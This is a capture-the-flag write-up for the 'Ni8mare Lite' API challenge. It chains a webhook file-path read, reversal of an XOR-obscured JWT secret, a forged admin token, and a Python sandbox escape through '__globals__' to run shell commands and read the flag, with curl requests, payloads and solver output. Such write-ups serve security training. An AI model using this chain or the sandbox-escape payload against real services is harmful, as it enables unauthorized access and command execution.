# Ni8mare Lite

## Metadata

| Field | Value |
| --- | --- |
| Category | `api` |
| Difficulty | Hard |
| Points | 100 |
| Solves | 91 |
| First Blood | Redz |

## Challenge Description

```text
FlowForge automates your workflows so you don't have to. A fresh instance just
went up for internal use, source and all; the docs are at /api/docs.

The flag is somewhere on the server's filesystem. Good luck.
```

Target used during validation:

```text
https://c635933ea2385b91.chal.ctf.ae
```

The archive password was:

```text
infected
```

## Artifacts

The provided archive contained the complete Flask service:

```text
public.zip
extracted/app.py
extracted/entrypoint.sh
extracted/Dockerfile
extracted/requirements.txt
```

Artifacts produced during the solve:

```text
solve_ni8marelite.py
assets/01_health.json
assets/02_config_leak.json
assets/03_forged_admin_token.json
assets/04_token_verify.json
assets/05_system_info.json
assets/06_root_listing.json
assets/07_flag.json
```

I did not include browser screenshots because the application is an API service.
The meaningful evidence is in HTTP JSON responses and in the shipped source.

## Recon

I started from the archive contents, not from the challenge title:

```bash
zipinfo public.zip
```

Relevant output:

```text
Archive:  public.zip
Zip file size: 5494 bytes, number of entries: 4
Dockerfile
app.py
entrypoint.sh
requirements.txt
```

The extracted source is a single Flask application. The root route identified
the service and pointed at `/api/docs`:

```bash
curl -k -sS https://c635933ea2385b91.chal.ctf.ae/
```

Output:

```json
{
  "service": "FlowForge Automation Platform",
  "version": "2.1.0",
  "docs": "/api/docs"
}
```

The public docs exposed only a small unauthenticated surface:

```bash
curl -k -sS https://c635933ea2385b91.chal.ctf.ae/api/docs
```

Relevant output:

```json
{
  "endpoints": [
    {"path": "/api/health", "method": "GET"},
    {"path": "/api/webhooks/trigger", "method": "POST"},
    {"path": "/api/auth/verify", "method": "POST"}
  ],
  "version": "2.1.0"
}
```

The full source added the protected routes:

```text
/api/workflows/debug
/api/notifications/preview
/api/workflows/import
/api/workflows/evaluate
/api/workflows
/api/system/info
```

The first boundary check was the evaluator. It looked powerful, but it required
admin authentication:

```bash
curl -k -sS -X POST \
  https://c635933ea2385b91.chal.ctf.ae/api/workflows/evaluate \
  -H 'Content-Type: application/json' \
  -d '{"expression":"print(1)"}'
```

Output:

```json
{"error":"Admin authentication required"}
```

So the solve needed two primitives:

```text
unauthenticated user -> recover or forge admin authentication
admin user           -> execute enough code to read the randomized flag file
```

The source also contained several tempting paths that I checked but did not use
as the final chain:

1. `/api/workflows/debug` looks like command injection, but it only accepts
   `status`, `version`, `uptime`, or `help` after quoting and allowlisting
   (`extracted/app.py:288` to `extracted/app.py:330`).
2. `/api/notifications/preview` looks like template injection, but it only
   performs literal replacement after a restrictive character check
   (`extracted/app.py:333` to `extracted/app.py:375`).
3. `/api/workflows/import` looks like a file import primitive, but it is admin
   only and validates workflow structure (`extracted/app.py:378` to
   `extracted/app.py:445`).

The interesting unauthenticated route was `/api/webhooks/trigger`, because the
docs explicitly mention a `files` array, and the source shows that each supplied
file path is opened server-side.

## Vulnerability

The exploit combines three weaknesses:

1. External control of a server-side file path in `/api/webhooks/trigger`.
2. Reversible XOR "protection" of the JWT signing secret.
3. A Python sandbox escape in the admin-only workflow evaluator.

The file-read issue is in `webhook_trigger()`:

```python
fpath = os.path.normpath(fpath)
if not any(fpath.endswith(ext) for ext in ALLOWED_FILE_EXTENSIONS):
    ...
with open(fpath, "r") as f:
    content = f.read(4096)
```

The extension check blocks obvious files such as `/etc/passwd`:

```bash
curl -k -sS -X POST \
  https://c635933ea2385b91.chal.ctf.ae/api/webhooks/trigger \
  -H 'Content-Type: application/json' \
  -d '{"workflow_id":"probe","files":[{"path":"/etc/passwd"}]}'
```

Output:

```json
{
  "file_metadata": [
    {
      "error": "Unsupported file extension. Allowed: .json, .yml, .db",
      "path": "/etc/passwd"
    }
  ],
  "status": "triggered",
  "workflow_id": "probe"
}
```

However, the check does not restrict files to a safe directory. Any absolute
path ending in `.json`, `.yml`, or `.db` can be opened. That matters because
`init_app()` writes an internal JSON file at `/app/.internal/config.json`
(`extracted/app.py:93` to `extracted/app.py:101`).

The internal file contains `session_secret`, but not directly. During startup,
the app creates the real `SESSION_SECRET`, derives a key from the boot
timestamp, XORs the ASCII secret, and stores the result:

```python
BOOT_TIMESTAMP = int(time.time())
SESSION_SECRET = os.urandom(24).hex()
ts_hash = hashlib.sha256(str(BOOT_TIMESTAMP).encode()).digest()
xor_key = ts_hash[: len(SESSION_SECRET)]
XOR_ENCODED_SECRET = xor_bytes(SESSION_SECRET.encode(), xor_key).hex()
```

This looked like a real obstacle until I noticed `/api/health` returns the same
`BOOT_TIMESTAMP` as `started_at` (`extracted/app.py:136` to
`extracted/app.py:145`). XOR is reversible, so leaking both `started_at` and the
encoded secret is enough to recover the actual JWT signing secret.

The next target was admin access. `verify_admin_token()` accepts HS256 JWTs
signed with `SESSION_SECRET`, and only checks that the decoded payload has
`role: admin` (`extracted/app.py:107` to `extracted/app.py:120`). Once the
secret is recovered, an admin JWT can be forged locally.

Finally, `/api/workflows/evaluate` executes Python code after a raw regex
blocklist (`extracted/app.py:448` to `extracted/app.py:525`). The blocklist
contains words such as `os`, `open`, `exec`, and `globals`, but it checks the
raw expression string before Python evaluates string concatenation. The
evaluator replaces `print` with a nested Python function named
`sandbox_print` (`extracted/app.py:489` to `extracted/app.py:495`). Python
function objects expose their module globals through `__globals__`, and the
module imported `os` at the top (`extracted/app.py:1` to `extracted/app.py:3`).

That allowed this idea:

```python
print.__getattribute__("__glo"+"bals__")["o"+"s"].popen("ls /").read()
```

It avoids the raw `globals` and `os` strings while still reaching the imported
`os` module at runtime.

## Exploitation

The full chain is:

1. Read `/api/health` to get `started_at`.
2. Use `/api/webhooks/trigger` to read `/app/.internal/config.json`.
3. Parse `session_secret` from the returned file preview.
4. Recover the real `SESSION_SECRET` by XORing the encoded bytes with
   `sha256(str(started_at)).digest()`.
5. Forge an HS256 JWT with `{"user":"admin","role":"admin"}`.
6. Verify the token with `/api/auth/verify`.
7. Access `/api/system/info` to confirm admin-only access.
8. Use `/api/workflows/evaluate` to run a sandbox escape and list `/`.
9. Read the randomized `/flag_<hex>.txt` file through the same evaluator.

The health response used in the final run is saved in `assets/01_health.json`:

```json
{
  "started_at": 1783383485,
  "status": "ok",
  "uptime_seconds": 152,
  "version": "2.1.0"
}
```

The internal config leak is saved in `assets/02_config_leak.json`:

```json
{
  "file_metadata": [
    {
      "metadata": {
        "preview": "{\n  \"session_secret\": \"24b4d270a11a147fb50c224add0c6b73fa1aab49e9d6bc615a1f2119e20ff7b677ecdd2bf44f142db85b764880003925\",\n  \"version\": \"2.1.0\"\n}",
        "size": 144
      },
      "path": "/app/.internal/config.json"
    }
  ],
  "status": "triggered",
  "workflow_id": "leak-config"
}
```

The recovered secret in that run was:

```text
0a6c4ddc8b1388c543bad3bcad063717c998a1d155e1e41c
```

After forging the JWT, `/api/auth/verify` confirmed the admin role. Evidence is
saved in `assets/04_token_verify.json`:

```json
{
  "role": "admin",
  "user": "admin",
  "valid": true
}
```

The sandbox escape first listed the root directory. Evidence is saved in
`assets/06_root_listing.json`:

```json
{
  "result": "app\nbin\nboot\ndev\nentrypoint.sh\netc\nflag_4bb6906514bcb37c.txt\nhome\nlib\nlib64\nmedia\nmnt\nopt\nproc\nroot\nrun\nsbin\nsrv\nsys\ntmp\nusr\nvar\n",
  "variables": {}
}
```

Then the exploit read the discovered flag path. Evidence is saved in
`assets/07_flag.json`:

```json
{
  "result": "flag{44aa87ae9af2b7d6}",
  "variables": {}
}
```

## Technical Details

The stored secret can be reversed because XOR is its own inverse:

```text
encoded = secret_ascii XOR key
secret_ascii = encoded XOR key
```

The key is derived from the public boot timestamp:

```python
key = sha256(str(started_at).encode()).digest()
```

`SESSION_SECRET` is a 48-character ASCII hex string because the app calls
`os.urandom(24).hex()`. The SHA-256 digest is 32 bytes, so `xor_bytes()` cycles
the key with `key[i % len(key)]` (`extracted/app.py:72` to
`extracted/app.py:75`).

The final evaluator payload used by the solver is:

```python
print(print.__getattribute__("__glo"+"bals__")["o"+"s"].popen("ls /").read())
```

For the flag read, only the command changes:

```python
print(print.__getattribute__("__glo"+"bals__")["o"+"s"].popen("cat /flag_4bb6906514bcb37c.txt").read())
```

This is not a generic "eval is bad" conclusion. The practical escape depends on
three implementation details that are visible in the source:

1. `exec()` executes attacker-controlled code after only a blocklist.
2. The sandbox replaces `print` with a real Python function object
   (`sandbox_print`); even though that function is nested inside
   `workflow_evaluate()`, its `__globals__` points back to the module globals.
3. The target module already imported `os`, so the function globals expose the
   `os` module and command execution becomes reachable without using `import`.

## Exploit Artifact

`solve_ni8marelite.py` implements the full exploit with only the Python standard
library. It manually creates the HS256 JWT, so it does not need PyJWT installed
locally.

Usage:

```bash
python3 solve_ni8marelite.py --insecure --evidence-dir assets \
  https://c635933ea2385b91.chal.ctf.ae
```

Output from the validated run:

```text
[+] Reading health endpoint for boot timestamp
[+] Leaking /app/.internal/config.json through webhook file metadata
[+] Recovered SESSION_SECRET: 0a6c4ddc8b1388c543bad3bcad063717c998a1d155e1e41c
[+] Verifying forged admin token
[+] Confirming admin-only endpoint access
[+] Escaping evaluate sandbox to list /
[+] Found flag file: /flag_4bb6906514bcb37c.txt
[+] Reading flag through evaluate sandbox escape
{
  "result": "flag{44aa87ae9af2b7d6}",
  "variables": {}
}
```

If the certificate is valid in the review environment, remove `--insecure`.

## Validation

Script syntax check:

```bash
python3 -m py_compile solve_ni8marelite.py
```

Remote exploit validation:

```bash
python3 solve_ni8marelite.py --insecure --evidence-dir assets \
  https://c635933ea2385b91.chal.ctf.ae
```

Result:

```text
flag{44aa87ae9af2b7d6}
```

Evidence files:

```text
assets/01_health.json
assets/02_config_leak.json
assets/03_forged_admin_token.json
assets/04_token_verify.json
assets/05_system_info.json
assets/06_root_listing.json
assets/07_flag.json
```

## References

- <https://cwe.mitre.org/data/definitions/73.html>
- <https://cwe.mitre.org/data/definitions/22.html>
- <https://cheatsheetseries.owasp.org/cheatsheets/JSON_Web_Token_for_Java_Cheat_Sheet.html>
- <https://hacktricks.wiki/en/generic-methodologies-and-resources/python/bypass-python-sandboxes/index.html>

## Flag

```text
flag{44aa87ae9af2b7d6}
```
